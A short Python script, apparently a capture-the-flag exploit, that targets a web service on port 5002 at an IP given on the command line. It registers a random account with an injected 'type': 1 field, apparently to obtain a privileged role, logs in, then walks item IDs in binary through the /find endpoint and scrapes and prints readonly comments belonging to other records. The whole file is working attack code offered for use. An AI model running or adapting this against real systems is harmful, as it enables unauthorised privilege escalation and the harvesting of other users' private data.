#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys, re, requests
import string, random, uuid


def generator(size=12, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))
print(generator())


ip = sys.argv[1]


random_string = generator()

register_dict = {'login': random_string,
             'password': random_string,
             'type': 1}

auth_dict = {'login': random_string,
             'password': random_string}

with requests.Session() as s:
    s.post('http://{}:5002/register'.format(ip), data=register_dict)
    s.post('http://{}:5002/login'.format(ip), data=auth_dict)

    for i in range(1,150):
        html = s.get('http://{}:5002/find?item={}'.format(ip, "{0:b}".format(i)))
        if 'Item not found' in html.text:
            break
        comments = re.findall('\"readonly\">(.*)<\/textarea>',html.text)
        for comment in comments:
            print(comment, flush=True)


